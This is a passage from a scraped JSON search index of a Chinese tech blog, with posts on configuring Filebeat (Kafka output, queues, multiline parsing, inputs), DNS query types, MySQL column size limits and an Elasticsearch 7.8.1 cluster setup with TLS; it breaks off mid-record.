指定输出kafka分区策略，三个选项random,round_robin,hash. 默认hash random.group_events: 向一个分区写入事件的数量，达到数量后会随机选择一个新分区。默认值是1，即在每个事件之后随机选择一个新分区。 round_robin.group_events: 向一个分区写入事件的数量，达到数量后会选择下一个分区。默认值是1，即在每个事件之后选择下一个分区。 hash.hash: 用于计算分区hash值的属性列表，没有定义则使用key设置的值 hash.random: 如果无法计算hash或key，则随机分发事件。 random|round_robin|hash.reachable_only: 默认情况下，所有分区策略将尝试向所有分区发布事件。如果filebeat无法访问分区的leader，output可能会阻塞。如果reachable_only设置为true，事件将只发布到可用分区。 codec: 输出编码格式，默认json metadata: Kafka元数据更新相关设置。metadata信息brokers, topics, partition, 和活动的leaders等信息 refresh_frequency: 元数据刷新间隔。默认为10分钟。 retry.max: 集群在leader选举时重试读取元数据次数。缺省值是3。 retry.backoff: 重试时间间隔。 bulk_max_size: 单个kafka处理的最大事件数。默认值为50 timeout: 等待kafka brokers的响应时间。默认30s broker_timeout: channel_buffer_size: 每个Kafka broker输出管道中缓冲的消息数。缺省值是256。 keep_alive: 连接的存活时间，默认为0，禁用保持活动连接状态 compression: 压缩类型，none、snappy、lz4、gzip。默认gzip compression_level: gzip压缩级别。设置为0禁用压缩。压缩级别必须在1（最佳速度）到9（最佳压缩）的范围内。增加压缩级别会减少网络使用，但会增加cpu使用。默认4 max_message_bytes: JSON消息的最大允许大小。超出的消息将被删除。缺省值是1000000(字节)。此值应小于kafka配置中broker的message.max.bytes参数 required_acks: kafka的响应返回值，0位无等待响应返回，继续发送下一条消息；1表示等待本地提交（leader broker已经成功写入，但follower未写入），-1表示等待所有副本的提交，默认为1 ssl: ssl相关配置.https://www.elastic.co/guide/en/beats/filebeat/6.8/configuration-ssl.html ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:3","tags":["elk","filebeat"],"title":"ELK-filebeat配置output(七)","uri":"/post/2269/"},{"categories":["ELK日志收集"],"content":"事件被发送前会被存储到内部队列中，队列负责缓冲事件，并将其组合成可由output使用的批处理。output将使用批量操作在一个事务中发送一批事件。 ","date":"2021-03-19 10:04","objectID":"/post/2266/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat队列简介(六) ","uri":"/post/2266/"},{"categories":["ELK日志收集"],"content":"内存队列： 当队列中有512个事件或者收到事件5秒后，则此示例配置将事件转发到output： queue.mem: events: 4096 flush.min_events: 512 flush.timeout: 5s ","date":"2021-03-19 10:04","objectID":"/post/2266/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeat队列简介(六) ","uri":"/post/2266/"},{"categories":["ELK日志收集"],"content":"参数说明 events 队列可以存储的最大事件数，默认4096 flush.min_events 默认: 2048。队列存储的最小事件数，如果设置为0，则直接将事件发送到output flush.timeout 默认: 1s. 收到一个事件等待10秒后,将队列中的事件发送到output。 如果设置为0，则直接将队列中事件发送到output flush.min_events和flush.timeout无论哪个参数先符合要求都会将事件发送到output output中的bulk_max_size可以限制一次处理事件的数量 ","date":"2021-03-19 10:04","objectID":"/post/2266/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeat队列简介(六) ","uri":"/post/2266/"},{"categories":["ELK日志收集"],"content":"一、全局选项 位于filebeat命名空间中。或者理解为字段 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.registry_file 指定注册表文件 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.registry_file_permissions 注册表文件的权限，默认是0600。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:2","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.registry_flush 将注册表写入(刷新)至磁盘的时间间隔。默认值为0s，在成功发布每批事件后，注册表将写入磁盘。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:3","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.shutdown_timeout Filebeat关闭前等待publisher发送事件的时间。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:4","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.config.inputs 说明:类似于include,把其他input配置文件导入进来 用法: filebeat.config.inputs: enabled: true path: configs/*.yml reload.enabled: true # 启用动态加载 reload.period: 20s # 20秒重新加载一次 ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:5","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"filebeat.config.modules 配置模块文件的路径 filebeat.config.modules: enabled: true path: ${path.config}/modules.d/*.yml ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:6","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"二、通用选项 所有Elastic Beats都支持这些选项。因为它们是通用选项，所以它们没有命名空间。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:0","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"name 如果该选项为空，则使用服务器的主机名。这个名称作为beat.name字段包含在每个发布的事务中。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:1","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"tags 值是一个列表，作为tags字段包含在每个发布的事务中。tags可以很容易地根据不同的逻辑属性对服务器进行分组。 例如，如果您有一个Web服务器集群，则可以将\"WebServers\"添加到每个服务器上的tags中，然后在Kibana Web界面中使用过滤器和查询以获取整个服务器组的可视化 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:2","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"fields 可选字段，可以添加一些自定义字段。值是字典，支持多种类型嵌套组合 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:3","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"fields_under_root 将自定义字段置到顶级，默认在fields字段下。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:4","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"processors 定义处理器，以便在事件发送到输出之前对其进行处理 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:5","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"max_procs 设置可以同时执行的最大CPU数。默认值是系统中可用的逻辑CPU数。 ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:6","tags":["elk","filebeat"],"title":"ELK-filebeat常规设置选项(五) ","uri":"/post/2262/"},{"categories":["ELK日志收集"],"content":"Filebeat收集的文件可能包含跨越多行文本的消息。例如，Java堆栈。为了正确处理这些多行消息，需要在filebeat.yml文件中配置多行设置，以指定哪些行是单个消息的一部分. ##一、 简单示例 filebeat.inputs: - type: log paths: - /var/log/test.log multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}' multiline.negate: true multiline.match: after ##二. 配置项说明 ###2.1 multiline.pattern 指定正则表达式。匹配的行被视为前一行的延续，其他行视为起始行。 与logstash的正则表达式有所不同。filebeat支持的正则表达式https://www.elastic.co/guide/en/beats/filebeat/6.8/regexp-support.html ###2.2 multiline.negate 定义是否为否定模式。 默认为false，匹配的行会被视为前一行的续行，不匹配的视为多行事件的开始 设置为true 匹配的行被视为多行事件的开始,不匹配的行视为前一行的续行 可以看2.3中的图，有助于理解。 ###2.3 multiline.match 设置匹配到的内容附加的位置。插入到前一行还是追加到后一行。before 或 after。 46580-q1fxvu7j4u9.png 上图为个人理解。不一定对。 ###2.4 multiline.flush_pattern 指定一个正则表达式，用来结束多行事件。 ###2.5 multiline.max_lines 如果多行消息包含的行数超过max_lines，则将删除所有其他行。默认值为500。 ###2.6 multiline.timeout 在指定的时间后，指定的正则即使没有启动新事件，Filebeat也会发送多行事件。默认值为5s。 ","date":"2021-03-18 17:32","objectID":"/post/2256/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置多行解析(四)","uri":"/post/2256/"},{"categories":["ELK日志收集"],"content":"三、例子 filebeat.inputs: - type: log paths: - /var/log/test.log multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}' multiline.negate: true multiline.match: after output.elasticsearch: hosts: [\"es-01:9200\", \"es-02:9200\", \"es-03:9200\"] 解析：将所有以日期(xxxx-xx-xx)开头的行，作为多行事件的开始。直至遇到下一个多行事件时结束,或者等待multiline.timeout时间 例如下面的日志会被解析成4条日志： 2021-03-18 17:54:20.848 DEBUG 123521 --- [ XNIO-1 task-2] o.s.s.m.ResBagRelationM 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot ================ Response Start ================ ===Result=== {\"code\":200} \u003c=== GET: /xixxxnfos (6 ms) ================ Response End ================ 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot 官方给的其他例子 https://www.elastic.co/guide/en/beats/filebeat/6.8/_examples_of_multiline_configuration.html ","date":"2021-03-18 17:32","objectID":"/post/2256/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置多行解析(四)","uri":"/post/2256/"},{"categories":["ELK日志收集"],"content":"input即配置从哪里获取日志 ","date":"2021-03-17 15:34","objectID":"/post/2248/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置input(三)  ","uri":"/post/2248/"},{"categories":["ELK日志收集"],"content":"一、input配置格式 filebeat.inputs: - type: log paths: - /var/log/system.log - /var/log/wifi.log - type: log paths: - \"/var/log/apache2/*\" fields: apache: true fields_under_root: true 可以同时配置多个input类型，方便学习可以在配置文件中添加logging.level: debug 一个事件的json数据 { \"@timestamp\": \"2021-03-17T11:53:54.324Z\", \"@metadata\": { \"beat\": \"filebeat\", \"type\": \"doc\", \"version\": \"6.8.5\" }, \"tags\": [ \"test\", \"ok\" ], \"prospector\": { \"type\": \"log\" }, \"input\": { \"type\": \"log\" }, \"source\": \"/var/log/test.log\", \"offset\": 555, \"log\": { \"file\": { \"path\": \"/var/log/test.log\" } }, \"message\": \"{\\\"a\\\": \\\"2021-03-17 19:53:52\\\", \\\"a1\\\": \\\"aaaaa\\\"}\", \"host\": { \"name\": \"soulchild-temp\" }, \"beat\": { \"name\": \"soulchild-temp\", \"hostname\": \"soulchild-temp\", \"version\": \"6.8.5\" } } ","date":"2021-03-17 15:34","objectID":"/post/2248/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置input(三)  ","uri":"/post/2248/"},{"categories":["ELK日志收集"],"content":"二、input类型可以是如下内容 Log Stdin Redis UDP Docker TCP Syslog NetFlow ","date":"2021-03-17 15:34","objectID":"/post/2248/:2:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置input(三)  ","uri":"/post/2248/"},{"categories":["ELK日志收集"],"content":"三、不同input类型的配置 公共选项 所有input均支持以下配置选项。 enable: 启用或禁用一个input。true or false tags: Filebeat包含在每个已发布事件的标签字段中的标签列表。使用tag可以轻松地在Kibana中选择特定事件或在Logstash中应用条件过滤。这些tag会被附加到tags字段中 fields: 自定义字段,配置如下 fields: app_id: 1 app_name: \"test\" fields_under_root: 如果为true，自定义字段将会被放置顶层。默认是在fields下 processors: 定义处理器，以便在事件发送到output之前对其进行处理 pipeline: 管道由多个处理器和一个队列组成。为该input事件生成管道ID ","date":"2021-03-17 15:34","objectID":"/post/2248/:3:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置input(三)  ","uri":"/post/2248/"},{"categories":["ELK日志收集"],"content":"1. log 1.1 配置示例 filebeat.inputs: - type: log paths: - /var/log/system.log - /var/log/wifi.log - type: log paths: - \"/var/log/nginx/*.log\" fields: nginx: true fields_under_root: true 1.2 配置选项 paths: 数组类型。配置日志文件路径。可以使用/log/*.log,/log/*/*.log recursive_glob.enabled: 默认启用。支持路径深度扩展写法。比如/log/**/*.log，可以代表/log/*/*.log,/log/*/*/*.log,/log/*/*/*/*.log,/log/*/*/*/*/*.log…最多能代表8级。 encoding: 日志文件编码格式。plain, latin1, utf-8, big5, gbk等等 exclude_lines: 排除日志文件中的某些行。支持正则。 filebeat.inputs: - type: log ... exclude_lines: ['^DBG', '^INFO'] include_lines: 只保留日志中的某些行。支持正则，写法同上。include比exclude先执行。 tail_files: 如果此选项设置为true，Filebeat将在每个文件的末尾而不是开头开始读取新文件。如果将此选项与日志轮换结合使用，则可能会跳过新文件中的第一个日志条目。默认设置为false. 此选项适用于Filebeat尚未处理过的文件。如果您以前运行了Filebeat，并且文件的状态已经持久化，那么将不适用tail_files。harvester将在最后记录的偏移处继续进行。要将tail_files应用于所有文件，必须停止Filebeat并删除注册表文件。请注意，这样做会删除所有以前的状态。注册表文件路径：/var/lib/filebeat/registry harvester_buffer_size: 每个harvester读取文件时，使用的缓冲区大小。默认是16384(字节)。 max_bytes: 一条日志的最大字节数。大于此大小的日志会被丢弃。此设置对于多行日志很有用，因为多行日志可能会变大。默认值是10MB(10485760)。 json: 将日志的每一行作为json来解析。json解码发生在过滤行和多行配置之间，下面是配置示例 # 默认情况下，解码后的json对象会放在json字段下,比如日志是{\"log\": \"test\"}字段，在kibana中呈现的就是json.log字段，如果启用此设置将会吧json对象放置顶层，呈现为log字段。默认为false。 json.keys_under_root: true # 如果keys_under_root被启用，那么在key冲突的情况下，解码后的JSON对象将覆盖Filebeat正常的字段。脏数据可能会导致(Cannot index event publisher.Event报错) json.overwrite_keys: true # 如果启用此设置将会添加一个字段\"error.message\"用来描述json解析出错的信息。还会添加另一对KV：\"error.type: json\"，代表错误类型是json json.add_error_key: true # message_key：可选配置，指定要应用 行筛选和多行设置的JSON key。如果指定了该key，则该key必须位于JSON对象的顶级，并且与该key关联的值必须是字符串，否则不会进行筛选或多行聚合。 json.message_key: log # 可选配置，如果为false会在filebeat日志中打印出json解析报错信息，默认为false json.ignore_decoding_error: true multiline: 控制Filebeat如何处理跨多行日志消息的选项。有关配置多行选项的详细信息，请参阅管理多行消息。https://www.elastic.co/guide/en/beats/filebeat/6.8/multiline-examples.html exclude_files: 不收集指定的日志文件，支持正则。例如：exclude_files: [’.gz$'] ignore_older: 如果启用此选项，则Filebeat将忽略在指定的 时间跨度 之前修改的任何文件。可以使用2h和5m这样的配置。 比如我设置2m，再我启动filebeat的时候，只会收集2分钟以内被修改过的文件，2分钟之前的不会管。ignore_older必须比close_inactive更大。 close_inactive:当启用此选项时，如果在指定的持续时间内没有收集到日志，则Filebeat将关闭文件句柄。 close_*: 这个选项用于在特定条件或时间过后关闭harvester。关闭harvester意味着关闭文件处理程序。如果在关闭harvester之后更新文件，则在scan_frequency过去之后将再次拾取该文件。但是，如果在harvester关闭时移动或删除文件，Filebeat将无法再次拾取该文件，并且harvester尚未读取的任何数据都将丢失。 scan_frequency: Filebeat多久检查一次收集的路径中的新日志文件。例如，如果您指定/var/log/*.log，则使用scan_frequency指定的频率在目录中扫描文件。不建议将此值设置为\u003c1s。 ","date":"2021-03-17 15:34","objectID":"/post/2248/:3:1","tags":["elk","filebeat"],"title":"ELK-filebeat配置input(三)  ","uri":"/post/2248/"},{"categories":["ELK日志收集"],"content":"更多安装方式：https://www.elastic.co/guide/en/beats/filebeat/6.8/filebeat-installation.html rpm安装 curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.5-x86_64.rpm sudo rpm -vi filebeat-6.8.5-x86_64.rpm 二进制安装 curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.14-linux-x86_64.tar.gz tar xzvf filebeat-6.8.14-linux-x86_64.tar.gz 下文引用自: https://www.cnblogs.com/cjsblog/p/9495024.html 官方文档: https://www.elastic.co/guide/en/beats/filebeat/6.8/how-filebeat-works.html#how-filebeat-works ","date":"2021-03-17 10:28","objectID":"/post/2245/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["ELK日志收集"],"content":"Filebeat是如何工作的 Filebeat由两个主要组件组成：inputs 和 harvesters （直译：收割机，采集器）。这些组件一起工作以跟踪文件，并将事件数据发送到你指定的输出。 ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["ELK日志收集"],"content":"1.harvester是什么 一个harvester负责读取一个单个文件的内容。 harvester逐行读取每个文件（一行一行地读取每个文件），并把这些内容发送到输出。 每个文件启动一个harvester。 harvester负责打开和关闭这个文件，这就意味着在harvester运行时文件描述符保持打开状态。 在harvester正在读取文件内容的时候，文件被删除或者重命名了，那么Filebeat会续读这个文件。这就有一个问题了，就是只要负责这个文件的harvester没用关闭，那么磁盘空间就不会释放。默认情况下，Filebeat保存文件打开直到close_inactive到达。 ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["ELK日志收集"],"content":"2.input是什么 一个input负责管理harvesters，并找到所有要读取的源。 如果input类型是log，则input查找驱动器上与已定义的glob路径匹配的所有文件，并为每个文件启动一个harvester。 每个input都在自己的Go例程中运行。 下面的例子配置Filebeat从所有匹配指定的glob模式的文件中读取行： filebeat.inputs: - type: log paths: - /var/log/*.log - /var/path2/*.log ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:2","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["ELK日志收集"],"content":"3.Filebeat如何保持文件状态 Filebeat保存每个文件的状态，并经常刷新状态到磁盘上的注册文件（registry）。状态用于记住harvester读取的最后一个偏移量，并确保所有日志行被发送（到输出）。如果输出，比如Elasticsearch 或者 Logstash等，无法访问，那么Filebeat会跟踪已经发送的最后一行，并只要输出再次变得可用时继续读取文件。当Filebeat运行时，会将每个文件的状态新保存在内存中。当Filebeat重新启动时，将使用注册文件中的数据重新构建状态，Filebeat将在最后一个已知位置继续每个harvester。 对于每个输入，Filebeat保存它找到的每个文件的状态。因为文件可以重命名或移动，所以文件名和路径不足以标识文件。对于每个文件，Filebeat存储惟一标识符，以检测文件是否以前读取过。 如果你的情况涉及每天创建大量的新文件，你可能会发现注册表文件变得太大了。 （画外音：Filebeat保存每个文件的状态，并将状态保存到registry_file中的磁盘。当重新启动Filebeat时，文件状态用于在以前的位置继续读取文件。如果每天生成大量新文件，注册表文件可能会变得太大。为了减小注册表文件的大小，有两个配置选项可用：clean_remove和clean_inactive。对于你不再访问且被忽略的旧文件，建议您使用clean_inactive。如果想从磁盘上删除旧文件，那么使用clean_remove选项。） ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:3","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["ELK日志收集"],"content":"4.Filebeat如何确保至少投递一次（at-least-once）？ Filebeat保证事件将被投递到配置的输出中至少一次，并且不会丢失数据。Filebeat能够实现这种行为，因为它将每个事件的投递状态存储在注册表文件中。 在定义的输出被阻塞且没有确认所有事件的情况下，Filebeat将继续尝试发送事件，直到输出确认收到事件为止。 如果Filebeat在发送事件的过程中关闭了，则在关闭之前它不会等待输出确认所有事件。当Filebeat重新启动时，发送到输出（但在Filebeat关闭前未确认）的任何事件将再次发送。这确保每个事件至少被发送一次，但是你最终可能会将重复的事件发送到输出。你可以通过设置shutdown_timeout选项，将Filebeat配置为在关闭之前等待特定的时间。 ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:4","tags":["elk","filebeat"],"title":"ELK-filebeat安装和简介(一)","uri":"/post/2245/"},{"categories":["基础内容"],"content":"一、四种不同类型的域名服务器： ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:0","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"1. 根域名服务器 全世界一共有13台ipv4根服务器(13个集群)，25台ipv6根服务器。根域名服务器一般就返回域名所属顶级域的顶级域服务器的IP地址。 存的记录比较少，记录的是com、cn、net、org这种顶级域服务器的ip地址或其他记录。 ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:1","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"2. 顶级域服务器 这种域名服务器负责 管理 在该顶级域名服务器上注册的所有二级域名。当收到DNS查询请求时，就给出相应的回答（可能是最后的结果，也可能是下一级权限域名服务器的地址）。 ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:2","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"3. 权限(权威)域名服务器 二级(jd.cn)、三级(www.jd.cn)或更多级别的域名可以归为权限服务器。（可能是最后的结果，也可能是下一级权限域名服务器的地址）。 ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:3","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"4. 本地域名服务器 一般就是本地配置的DNS地址，可能是路由器的地址，也可能是网络运营商提供的DNS地址 ","date":"2021-03-12 16:17","objectID":"/post/2237/:1:4","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"二、递归查询 一层一层的进去，然后一层一层的回来。 客户端--\u003e本地域名服务器--\u003e根域名服务器--\u003e顶级域名服务器--\u003e权限域名服务器 ↓ 客户端\u003c--本地域名服务器\u003c--根域名服务器\u003c--顶级域名服务器 22192-ddhfwya1ijl.png ","date":"2021-03-12 16:17","objectID":"/post/2237/:2:0","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["基础内容"],"content":"三、迭代查询 一来一回的查询。 客户端–\u003e本地域名服务器(这里是递归查询) 本地域名服务器–\u003e根域名服务器(.)–\u003e告诉本地域名服务器找顶级域名服务器(.com) 本地域名服务器–\u003e顶级域名服务器(.com)–\u003e告诉本地域名服务器找权限域名服务器(.abc.com) 本地域名服务器–\u003e权限域名服务器(.abc.com)–\u003ey.abc.com归属于.abc.com所管。所以直接告诉本地域名服务器最终结果 49054-jvu52euvwop.png 第一步中为何使用递归查询？ 如果第一步使用迭代查询，那么后面的请求都需要请求主机(客户机)来参与完成，这样会增大请求主机的压力。所以通常情况下请求主机和本地域名服务器是使用递归查询。 ","date":"2021-03-12 16:17","objectID":"/post/2237/:3:0","tags":["dns"],"title":"DNS递归查询和迭代查询","uri":"/post/2237/"},{"categories":["databases"],"content":"TINYINT 1 字节 有符号: -128，127 无符号: 0，255 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:1","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"SMALLINT 2 字节 有符号: -32768，32767 无符号: 0，65535 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:2","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMINT 3 字节 有符号: -8388608，8388607 无符号: 0，16777215 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:3","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"INT或INTEGER 4 字节 有符号: -2147483648，2147483647 无符号: 0，4294967295 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:4","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"BIGINT 8 字节 有符号: -9233372036854775808，9223372036854775807 无符号: 0，18446744073709551615 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:5","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"CHAR 0-255字节 定长字符串 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:6","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"VARCHAR 0-255字节 变长字符串 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:7","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"TINYBLOB 0-255字节 不超过 255 个字符的二进制字符串 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:8","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"TINYTEXT 0-255字节 短文本字符串 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:9","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"BLOB 0-65 535字节 二进制形式的长文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:10","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"TEXT 0-65 535字节 长文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:11","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMBLOB 0-16 777 215字节 二进制形式的中等长度文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:12","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"MEDIUMTEXT 0-16 777 215字节 中等长度文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:13","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"LOGNGBLOB 0-4 294 967 295字节 二进制形式的极大文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:14","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["databases"],"content":"LONGTEXT 0-4 294 967 295字节 极大文本数据 ","date":"2021-03-10 20:09","objectID":"/post/2789/:0:15","tags":["mysql"],"title":"mysql 不同类型的大小限制","uri":"/post/2789/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"1.下载二进制包 wget -O /server/packages/elasticsearch-7.8.1-linux-x86_64.tar.gz https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.1-linux-x86_64.tar.gz ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:1","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"2.解压安装 tar xf elasticsearch-7.8.1-linux-x86_64.tar.gz -C /usr/local/ ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:2","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"3.优化 vim /etc/sysctl.conf fs.file-max=655360 vm.max_map_count = 262144 重新加载配置 sysctl -p vim /etc/security/limits.conf * soft nproc 20480 * hard nproc 20480 * soft nofile 65536 * hard nofile 65536 * soft memlock unlimited * hard memlock unlimited vim /etc/security/limits.d/20-nproc.conf * soft nproc 40960 root soft nproc unlimited ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:3","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"4.修改es配置 vim /usr/local/elasticsearch-7.8.1/config/elasticsearch.yml cluster.name: elk-cluster node.name: node-1 path.data: /data/es/ path.logs: /usr/local/elasticsearch-7.8.1/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 discovery.zen.minimum_master_nodes: 2 cluster.initial_master_nodes: [\"172.17.10.161:9300\"] discovery.zen.ping.unicast.hosts: [\"172.17.10.161:9300\",\"172.17.10.162:9300\",\"172.17.10.163:9300\"] xpack.security.enabled: true # 集群节点间通信加密 xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 # 配置https加密 xpack.security.http.ssl.enabled: true xpack.security.http.ssl.keystore.path: elastic-certificates.p12 xpack.security.http.ssl.truststore.path: elastic-certificates.p12 ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:4","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"5.创建用户、es数据目录 useradd elasticsearch chown -R elasticsearch.elasticsearch /usr/local/elasticsearch-7.8.1 mkdir /data/es -p chown -R elasticsearch.elasticsearch /data/es ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:5","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"6.生成证书 cd /usr/local/elasticsearch-7.8.1 bin/elasticsearch-certutil ca bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 # 修改权限 chown elasticsearch.elasticsearch elastic-*.p12 # 拷贝到配置文件目录 mv elastic-*.p12 config/ ","date":"2021-03-10 